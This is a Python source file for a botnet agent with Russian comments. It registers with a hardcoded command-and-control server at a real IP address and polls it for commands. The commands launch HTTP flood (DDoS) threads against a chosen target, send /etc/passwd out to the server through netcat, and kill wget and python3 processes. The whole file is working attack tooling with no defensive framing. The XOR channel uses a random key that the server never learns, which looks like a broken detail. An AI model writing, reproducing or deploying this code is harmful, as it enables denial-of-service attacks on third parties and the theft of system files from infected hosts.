#!/usr/bin/env python3
# AVZ-Aristo Agent v25.15 – XOR обфускация
import socket, json, time, os, platform, subprocess, threading, random, base64

C2_HOST = "80.249.146.202"
C2_PORT = 80
XOR_KEY = random.randint(1, 255)  # Генерируется при запуске

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def send_encrypted(sock, msg, key):
    sock.sendall(xor_encrypt(msg.encode(), key) + b'\n')

def recv_encrypted(sock, key):
    data = b''
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if b'\n' in data:
            break
    return xor_decrypt(data.rstrip(b'\n'), key).decode()

def get_info():
    return {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
        "ram": "unknown"
    }

def register():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        # Первое сообщение без шифрования (чтобы C2 понял, что агент новый)
        s.sendall(json.dumps(get_info()).encode() + b'\n')
        s.close()
    except: pass

def get_commands():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        # Используем XOR для последующего общения
        send_encrypted(s, 'ping', XOR_KEY)
        data = recv_encrypted(s, XOR_KEY)
        s.close()
        if data and data != "no commands":
            return json.loads(data)
    except: pass
    return []

def main():
    register()
    while True:
        cmds = get_commands()
        for cmd in cmds:
            if cmd.get("type") == "attack":
                target = cmd.get("target")
                threads = int(cmd.get("threads", 10))
                def flood():
                    import requests
                    for _ in range(threads):
                        try:
                            requests.get(target, timeout=2)
                        except: pass
                threading.Thread(target=flood, daemon=True).start()
            elif cmd.get("type") == "grab":
                os.system("cat /etc/passwd | nc {} {}".format(C2_HOST, C2_PORT))
            elif cmd.get("type") == "stop":
                os.system("pkill wget; pkill python3")
        time.sleep(5)

if __name__ == "__main__":
    main()
